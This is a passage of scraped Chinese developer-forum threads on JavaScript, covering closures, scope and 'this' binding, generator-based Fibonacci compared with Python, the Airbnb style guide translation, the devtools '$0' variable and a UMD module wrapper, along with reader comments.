class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">x</span><span class=\"o\">++</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n<span class=\"p\">};</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">inc1</span> <span class=\"o\">=</span> <span class=\"nx\">inc</span><span class=\"p\">();</span>\n<span class=\"kd\">var</span> <span class=\"nx\">inc2</span> <span class=\"o\">=</span> <span class=\"nx\">inc</span><span class=\"p\">();</span>\n\n<span class=\"nx\">inc1</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 0</span>\n<span class=\"nx\">inc1</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 1</span>\n<span class=\"nx\">inc2</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 0</span>\n<span class=\"nx\">inc1</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 2</span>\n<span class=\"nx\">inc2</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; 1</span>\n<span class=\"nx\">x</span><span class=\"p\">;</span>       <span class=\"c1\">// -&gt; 100</span>\n</pre></div>\n\n<p>执行过程如下图所示，<code>inc</code>内部返回的匿名function在创建时生成的作用域链包括了<code>inc</code>中的<code>x</code>，即使后来赋值给<code>inc1</code>和<code>inc2</code>之后，直接在<code>global context</code>下调用，它们的作用域链仍然是由定义中所处的上下文环境决定，而且由于<code>x</code>是在<code>function inc</code>中定义的，无法被外层的<code>global context</code>所改变，从而实现了闭包的效果：</p>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-closure.jpg\" alt=\"js closure\"></p>\n\n<h2>this in closure</h2>\n\n<p>我们已经反复提到执行上下文和作用域实际上是通过function创建、分割的，而function中的<code>this</code>与作用域链不同，它是由<strong>执行该function时</strong>当前所处的Object环境所决定的，这也是<code>this</code>最容易被混淆用错的一点。一般情况下的例子如下：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s2\">\"global\"</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"o\"</span><span class=\"p\">,</span>\n  <span class=\"nx\">getName</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">};</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">getName</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; \"o\"</span>\n</pre></div>\n\n<p>由于执行<code>o.getName()</code>时<code>getName</code>所绑定的<code>this</code>是调用它的<code>o</code>，所以此时<code>this == o</code>；更容易搞混的是在closure条件下：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s2\">\"global\"</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">oo</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"oo\"</span><span class=\"p\">,</span>\n  <span class=\"nx\">getNameFunc</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n      <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">;</span>\n    <span class=\"p\">};</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">oo</span><span class=\"p\">.</span><span class=\"nx\">getNameFunc</span><span class=\"p\">()();</span>  <span class=\"c1\">// -&gt; \"global\"</span>\n</pre></div>\n\n<p>此时闭包函数被<code>return</code>后调用相当于：</p>\n<div class=\"highlight\"><pre><span class=\"nx\">getName</span> <span class=\"o\">=</span> <span class=\"nx\">oo</span><span class=\"p\">.</span><span class=\"nx\">getNameFunc</span><span class=\"p\">();</span>\n<span class=\"nx\">getName</span><span class=\"p\">();</span>  <span class=\"c1\">// -&gt; \"global\"</span>\n</pre></div>\n\n<p>换一个更明显的例子：</p>\n<div class=\"highlight\"><pre>var ooo = {\n  name: \"ooo\",\n  getName: oo.getNameFunc() // 此时闭包函数的this被绑定到新的Object\n};\nooo.getName();  // -&gt; \"ooo\"\n</pre></div>\n\n<p>当然，有时候为了避免闭包中的<code>this</code>在执行时被替换，可以采取下面的方法：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s2\">\"global\"</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">oooo</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"ox4\"</span><span class=\"p\">,</span>\n  <span class=\"nx\">getNameFunc</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">self</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">;</span>\n    <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n       <span class=\"k\">return</span> <span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">;</span>\n    <span class=\"p\">};</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">};</span>\n<span class=\"nx\">oooo</span><span class=\"p\">.</span><span class=\"nx\">getNameFunc</span><span class=\"p\">()();</span> <span class=\"c1\">// -&gt; \"ox4\"</span>\n</pre></div>\n\n<p>或者是在调用时强行定义执行的Object：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s2\">\"global\"</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">oo</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"oo\"</span><span class=\"p\">,</span>\n  <span class=\"nx\">getNameFunc</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n      <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">;</span>\n    <span class=\"p\">};</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">oo</span><span class=\"p\">.</span><span class=\"nx\">getNameFunc</span><span class=\"p\">()();</span>  <span class=\"c1\">// -&gt; \"global\"</span>\n<span class=\"nx\">oo</span><span class=\"p\">.</span><span class=\"nx\">getNameFunc</span><span class=\"p\">().</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"nx\">oo</span><span class=\"p\">)();</span> <span class=\"c1\">// -&gt; \"oo\"</span>\n</pre></div>\n\n<h2>总结</h2>\n\n<p>Js是一门很有趣的语言，由于它的很多特性是针对HTML中DOM的操作，因而显得随意而略失严谨，但随着前端的不断繁荣发展和Node的兴起，Js已经不再是\"toy language\"或是jQuery时代的\"CSS扩展\"，本文提到的这些概念无论是对新手还是从传统Web开发中过度过来的Js开发人员来说，都很容易被混淆或误解，希望本文可以有所帮助。</p>\n\n<p>写这篇总结的原因是我在Github上分享的<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/coodict/javascript-in-one-pic\">Learn javascript in one picture</a>，刚开始有人质疑这只能算是一张语法表（syntax cheat sheet），根本不会涉及更深层的闭包、作用域等内容，但是出乎意料的是这个项目竟然获得3000多个star，所以不能虎头蛇尾，以上。</p>\n\n<h2>References</h2>\n\n<ol>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://ryanmorr.com/understanding-scope-and-context-in-javascript/\">Understanding Scope and Context in JavaScript</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this\">this - JavaScript | MDN</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures\">闭包 - JavaScript | MDN</a></li>\n</ol>\n</div></div>"], "reply": "9", "tittle": "图解 Javascript 上下文与作用域", "comment": ["Mark，以前看虚拟机代码的时候，这些其实也看不太明白。", "发现javascript的作用域和上下文与python是一样的,总结的挺好", "额，先顶一下！！我好像没有太划分上下文和作用域（上下文这个词也蛮坑的，我一直不理解为啥这么翻译过来）；；我理解的是；在JavaScript中，顶级作用域是Global的代理人window；这个是浏览器的顶级；里面的js代码；在预解释阶段。带var 和function的；var是先声明；function是开辟一个堆内存把function内的代码以字符串的方式储存起来，并且函数储存的是这个堆内存的内存地址（相当于引用一个内存地址；如果很多变量ABCD同时引用一个内存地址，只要其中任意一个变量修改了内存里面的内容，其它所有变量都会变的，因为函数是属于引用数据类型，储存的不是值而是内存地址）；预解释阶段过后，就是JS代码从上到下执行阶段；在执行的时候；如果遇到function的代码块会直接跳过；遇到函数执行的代码；会直接调用引用堆内存的地址；这个时候会重新开辟一个栈内存；这个栈内存还会再次进行预解释；套路和上面一样，（如果函数执行的这个小栈内存中需要用到某个变量，首先会看有没有声明和定义过，如果没有，则会到他的上一级作用域查找，一直查到window下）； 如果函数执行中return一个函数，并且这个小栈内存外面有变量接受；那么这个栈内存是没办法销毁的；如果没有变量接受，小的栈内存会在浏览器空闲的时候销毁；；；；我的拙见，请鞭策。", "补充一句： 如果函数执行中return一个函数或值，只要返回值外面有东西接收；作用域都没办法销毁；还有就是函数的执行位置和函数定义位置没有关系；", "“循环 + 立即执行匿名函数 + 计时器” 这样的搭配已经成考验本文知识的经典测试类型了\r", "\r", "PS：ES6 中的 let 能缓解这个坑", " 看得有点晕。。我没有研究过Js引擎的实现，也许 @", " 可以帮上忙，但是看你的描述感觉你关注的更多是GC的问题。关于上下文和作用域的划分，执行上下文可以粗暴的分为global和function两种，在具体的function中的，执行上下文就是包含当前可调用的所有合法的identifier的容器，这个容器由三部分组成，arguments+this、当前function定义的变量以及scope chain中所能查询到的合法identifier。这些其实并不难区分，最容易混淆的应该是决定this的（也有叫context的，我都不知道该怎么形容它了。。）。", "手工加精", "学习了。已star。", "star+ 微信捐赠"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"kd\">function</span><span class=\"o\">*</span> <span class=\"nx\">fib</span><span class=\"p\">(</span><span class=\"nx\">max</span><span class=\"p\">){</span>\n    <span class=\"kd\">var</span>\n        <span class=\"nx\">t</span><span class=\"p\">,</span>\n        <span class=\"nx\">n</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n        <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span>\n        <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"k\">while</span> <span class=\"p\">(</span> <span class=\"nx\">n</span><span class=\"o\">&lt;</span><span class=\"nx\">max</span> <span class=\"p\">){</span>\n        <span class=\"k\">yield</span> <span class=\"nx\">a</span><span class=\"p\">;</span>\n        <span class=\"nx\">t</span> <span class=\"o\">=</span> <span class=\"nx\">a</span><span class=\"o\">+</span><span class=\"nx\">b</span><span class=\"p\">;</span>\n        <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nx\">b</span><span class=\"p\">;</span>\n        <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"nx\">t</span><span class=\"p\">;</span>\n        <span class=\"nx\">n</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">a</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>而Python可以直接这么粗暴的写  </p>\n<div class=\"highlight\"><pre><span class=\"k\">def</span> <span class=\"nf\">fib</span><span class=\"p\">(</span><span class=\"n\">nmax</span><span class=\"o\">=</span><span class=\"bp\">None</span><span class=\"p\">):</span>\n    <span class=\"n\">nmax</span> <span class=\"o\">=</span> <span class=\"n\">nmax</span> <span class=\"ow\">or</span> <span class=\"mi\">10</span>\n    <span class=\"n\">n</span><span class=\"p\">,</span> <span class=\"n\">a</span><span class=\"p\">,</span> <span class=\"n\">b</span>  <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">1</span>\n    <span class=\"k\">while</span> <span class=\"n\">n</span> <span class=\"o\">&lt;</span> <span class=\"n\">nmax</span><span class=\"p\">:</span>\n        <span class=\"k\">yield</span> <span class=\"n\">a</span>\n        <span class=\"n\">a</span><span class=\"p\">,</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">b</span><span class=\"p\">,</span> <span class=\"n\">a</span><span class=\"o\">+</span><span class=\"n\">b</span>\n        <span class=\"n\">n</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n</pre></div>\n\n<p>然后把我搞晕了，我都不会写fibonacci了，为什么JS还需要个临时变量t, 如果 a, b = b, a+b结果是不正确的，然后为什么在循环体外还需要return返回最后的结果</p>\n</div></div>"], "reply": "22", "tittle": "关于 JavaScript 的 while 循环", "comment": ["你用 python 不就好了。你推动各大浏览器厂商改进JS语法也可以哦。", "好厉害，斐波那契都会算哦", "额，没有攻击语言的意思，只是搞不懂内部的原理。", "看下 go ，只有 for ，也挺好的。", "JavaScript初始化的n是1，python是0,所以最后要return\r", "JavaScript好像是不支持多返回值，所以需要用临时变量t", "小白，为什么function后面有个*", "不用临时变量你可以这么写：\r", "b = a + b; \r", "a = b - a;", "  \r", "这样就不用 t 了", " 刚写出来就发现有人答了\r", " \r", "你可以看看这个: )\r", "也不能要求各个语言都有这样类似py元组的语法糖呀……", "为什么nmax不直接写默认值？", "javascript与Python语法是有区别的，\r", "在js里如果“a, b = b, a+b”这样写，相当于执行了三条语句：\r", "a;\r", "b = b;\r", "a + b;", " 生成器语法", "用 ES6 就可以和 Python 写得一样：\r", "会写scala么", " firefox对ES6支持最全吧", " 用 babel 编译。", "试试Coffeescript!!!", "你应该先了解 python 的\r", "a, b = b, a+b\r", "实际上是 (a, b) = (b, a+b) 元组省略括号的写法\r", "看上去像是其他语言swap函数，但实际上不是", " 那个是generator", " 求网址 浏览器不支持运行es6", " "]},
{"content": ["<div class=\"topic_content\">see <a target=\"_blank\" href=\"http://fex.baidu.com/blog/2015/07/we-have-a-problem-with-promises/\" rel=\"nofollow\">http://fex.baidu.com/blog/2015/07/we-have-a-problem-with-promises/</a>\r<br>see <a target=\"_blank\" href=\"http://pouchdb.com/2015/05/18/we-have-a-problem-with-promises.html\" rel=\"nofollow\">http://pouchdb.com/2015/05/18/we-have-a-problem-with-promises.html</a></div>"], "reply": "4", "tittle": "We have a problem with promises", "comment": ["不错的文章 谢谢分享", "+1", "我不知道是我看的姿势不对么...我把这个当做鸡汤了...", "+1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原来有简体的中文翻译，但是并没有包括 ES6（aka.ES2015） 的内容。ES6 的版本有繁体中文版，但是一些名词和内地的说法不同，表述（我觉得）也怪怪的。所以自己动手重译了一次。比起其他的译本。主要多了两个内容：</p>\n\n<ul>\n<li>包含 ES6 的更新；</li>\n<li>在一些原文没有讲清楚或有歧义的地方，添加了一些参考链接和译注。</li>\n</ul>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/yuche/javascript\">Airbnb JavaScript 编码规范</a></p>\n\n<p>欢迎拍砖。</p>\n</div></div>"], "reply": "6", "tittle": "翻译： Airbnb JavaScript 编码规范", "comment": ["赞~", "给楼主点个赞。\r", "我也在 ES5 版翻译里加上了项目链接 :D", "star", "赞", "赞~楼主好敬业啊，还专门查了地球队长这个梗，可以做我男朋友吗", " 谢谢。我参考了很多你的翻译\r", "\r", " 我喜欢女人。。。这里好像没有女人吧。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>打开百度，打开谷歌审查元素，在控制台输入$0。显示的是&lt;div id=\"head\" class=\"s-skin-hasbg white-logo s-opacity-65\"&gt;＊＊＊＊&lt;/div&gt;<br>\n我有点晕，请大神指点下。</p>\n</div></div>"], "reply": "21", "tittle": "js 中的$0 代表什么？（今天面试的问题）", "comment": ["dev tool 选择的element", "你看 Chrome 的文档嘛\r", "\r", "\r", "\r", "这种调试用的变量用法都能找到说明", " 谢谢了，就是这个！哈哈！", " 准确的地址\r", " 这个挺好的，好像还有断点调试的，我好好看看，学习下。断点调试，这些是不是学习js应该掌握的知识？", " 谢谢，就是这个！", " 如果你用 Chrome 搞调试，那这些东西你应该掌握。不过这和 JavaScript 没什么关系。", "为什么程序员面试都喜欢考这些奇葩的知识", " $0这个哪里奇葩了，经常用调试工具不可能不知道", " 我以前没用过，这个把我给问住了，我回答：linux 中shell 编程里有这个，代表变量。其实我还想到了正则，但是js我真的没有想到。", " 我就不知道，因为我用 Firebug :-)", "我只想到了正则", " 我已经测试firebug 也有这个功能！", "看到过，但是从来没用过，也不知道其含义", " 哇也支持呢。Firebug 有好多这类小功能我都不知道的说……反正我也不是专业前端啦=w=", "\r", "\r", "建议看下这个。", "棒棒得，看来我也得重新看了", "然而，并没有什么卵用", "如果我哪一次发现有面试官给我考这种题，我绝对会默默给他写四个 “茴” 字。\r", "\r", "JavaScript最忌讳考这种偏门知识，知不知道这种知识点跟能力怎么样完全没什么太大关系好吧……", "这不算JS的问题吧，面试官应该想问你对devtools调试的熟悉程度，不过百度面试官问我的时候是另外的问法：用devtools时除了console.log()你还常用哪些", " console.dir console.table console.trace"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近围观了一下UMD，发现虽然不错，但是其实并不是非常通用，所以自己尝试折腾了一个来玩玩，发现还不错，就拿来给大家围观一下。水平渣渣，请轻拍。</p>\n\n<p>先不废话，先看个实例。一共是三个文件，example.js、lib1.js和lib2.js。其中example.js依赖lib1.js和lib2.js，同时也就是意味着example模块依赖lib1模块和lib2模块。</p>\n<div class=\"highlight\"><pre>-\n|-example.js\n|-lib1.js\n|-lib2.js\n</pre></div>\n\n<p>首先，来看看example.js。如下所示,example.js定义一个example模块输出\"example\"，并且调用lib1()和lib2()，依赖当前目录下的lib1模块和lib2模块。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//example.js</span>\n<span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">n</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"k\">typeof</span> <span class=\"nx\">define</span> <span class=\"o\">===</span> <span class=\"s1\">'function'</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">define</span><span class=\"p\">.</span><span class=\"nx\">amd</span><span class=\"p\">)</span>\n    <span class=\"nx\">define</span><span class=\"p\">(</span><span class=\"nx\">n</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"p\">);</span>\n  <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"k\">typeof</span> <span class=\"nx\">exports</span> <span class=\"o\">===</span> <span class=\"s1\">'object'</span><span class=\"p\">)</span>\n    <span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">exports</span> <span class=\"o\">=</span> <span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">){</span><span class=\"k\">return</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">)}));</span>\n  <span class=\"k\">else</span>\n    <span class=\"nx\">r</span><span class=\"p\">[</span><span class=\"nx\">n</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">){</span><span class=\"k\">return</span> <span class=\"nx\">r</span><span class=\"p\">[</span><span class=\"nx\">m</span><span class=\"p\">]}));</span>\n<span class=\"p\">}(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"s1\">'example'</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"s1\">'./lib1'</span><span class=\"p\">,</span> <span class=\"s1\">'./lib2'</span><span class=\"p\">],</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">lib1</span><span class=\"p\">,</span> <span class=\"nx\">lib2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n  <span class=\"kd\">var</span> <span class=\"nx\">myFunc</span> <span class=\"o\">=</span> <span class=\"kd\">function</span> <span class=\"nx\">myFunc</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'example'</span><span class=\"p\">);</span>\n    <span class=\"nx\">lib1</span><span class=\"p\">();</span>\n    <span class=\"nx\">lib2</span><span class=\"p\">();</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">return</span> <span class=\"nx\">myFunc</span><span class=\"p\">;</span>\n<span class=\"p\">}));</span>\n</pre></div>\n\n<p>接下来是lib1.js和lib2.js。下面是lib1.js的代码，定义一个lib1模块输出\"lib1\"，没有依赖。lib2.js的代码一样，定义一个lib2模块，输出\"lib2\"。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// lib1.js</span>\n<span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">n</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"k\">typeof</span> <span class=\"nx\">define</span> <span class=\"o\">===</span> <span class=\"s1\">'function'</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">define</span><span class=\"p\">.</span><span class=\"nx\">amd</span><span class=\"p\">)</span>\n    <span class=\"nx\">define</span><span class=\"p\">(</span><span class=\"nx\">n</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"p\">);</span>\n  <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"k\">typeof</span> <span class=\"nx\">exports</span> <span class=\"o\">===</span> <span class=\"s1\">'object'</span><span class=\"p\">)</span>\n    <span class=\"nx\">module</span><span class=\"p\">.</span><span class=\"nx\">exports</span> <span class=\"o\">=</span> <span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">){</span><span class=\"k\">return</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">)}));</span>\n  <span class=\"k\">else</span>\n    <span class=\"nx\">r</span><span class=\"p\">[</span><span class=\"nx\">n</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">,</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">m</span><span class=\"p\">){</span><span class=\"k\">return</span> <span class=\"nx\">r</span><span class=\"p\">[</span><span class=\"nx\">m</span><span class=\"p\">]}));</span>\n<span class=\"p\">}(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"s1\">'lib1'</span><span class=\"p\">,</span> <span class=\"p\">[],</span> <span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"kd\">var</span> <span class=\"nx\">myFunc</span> <span class=\"o\">=</span> <span class=\"kd\">function</span> <span class=\"nx\">myFunc</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'lib1'</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">return</span> <span class=\"nx\">myFunc</span><span class=\"p\">;</span>\n<span class=\"p\">}));</span>\n</pre></div>\n\n<p>来，最后来看看效果。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//在node里加载</span>\n<span class=\"kd\">var</span> <span class=\"nx\">example</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'./example'</span><span class=\"p\">);</span>\n<span class=\"nx\">example</span><span class=\"p\">();</span>\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"c1\">//在浏览器中使用require.js加载</span>\n<span class=\"nx\">require</span><span class=\"p\">([</span><span class=\"s1\">'example'</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">example</span><span class=\"p\">){</span><span class=\"nx\">example</span><span class=\"p\">();});</span>\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"c\">&lt;!-- 在浏览器中通过script标签加载 --&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"lib1.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"lib2.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"example.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n  <span class=\"nx\">example</span><span class=\"p\">();</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</pre></div>\n\n<p>上面三种方式都能正确输出如下结果</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//=&gt; \"example\"</span>\n<span class=\"c1\">//=&gt; \"lib1\"</span>\n<span class=\"c1\">//=&gt; \"lib2\"</span>\n</pre></div>\n</div></div>", "<div class=\"topic_content\">因为代码是从老版本那里复制出来的，所以出了一点问题。\r<br>修改为 r[n] = f.apply(r, d.map(function(m){return r[m.replace(/^.*\\//, '')]})); 才对</div>"], "reply": "9", "tittle": "同时兼容 AMD， CommandJS 和全局变量的模块化定义的一个通用实现", "comment": ["umd 哪里不通用请说明...", "你这不支持 CJS 啊，UMD 都没你这绕 ┑(￣Д ￣)┍", " \r", "\r", "1. 支持 CommandJS 你可以自己测试一下。我在node里面跑的无压力。我不支持的是CMD……不过感觉CMD有些坑，正在想办法加通用壳。\r", "\r", "2. 你该不会觉得你要手写这大串蛋疼东西吧？我折腾这套通用壳就是为了让它足够通用到直接用工具包装一下就能用的程度。这种重复无聊的工作请留给机器做。\r", "\r", "昨晚已完成把一个AMD模块直接包装成UMD模块的工具，我从来没想过这种蛋疼的东西需要人手工来做。 ", " \r", "\r", "我说的不通用并不是指标准不通用，而是代码不通用。不能简单的进行转换，仅此而已。\r", "\r", "我现在选用AMD做基准，然后通过用工具加通用壳来保证一处编写，到处运行的目的。而不需要到处写一大段重复代码。", " \r", " \r", "\r", "最新的代码模板，只需要把AMD模块套上这个壳，就可以同时兼容AMD，CommandJS和全局变量加载了，不需要多谢一行代码 ", " 好吧，我想说的就是 CMD。要支持其实不复杂，CMD 也是支持 `define(deps, factory)` 的，只不过 `factory` 的实参是 `require, exports, module`\r", "\r", "代码：\r", "\r", "``` js\r", "if (typeof __define__ === 'function' && __define__.cmd) {\r", "  __define__(dependencies, function (require, exports, module) {\r", "    module.exports = factory.apply(__root__, dependencies.map(function(m){\r", "      return require(m);\r", "    }));\r", "  })\r", "}```\r", "\r", "简单测了下，没啥问题", " \r", "\r", "我加上试试OwO ，谢啦~~~", "CommonJS 不是 CommandJS……", " \r", "嗯…打错了"]},
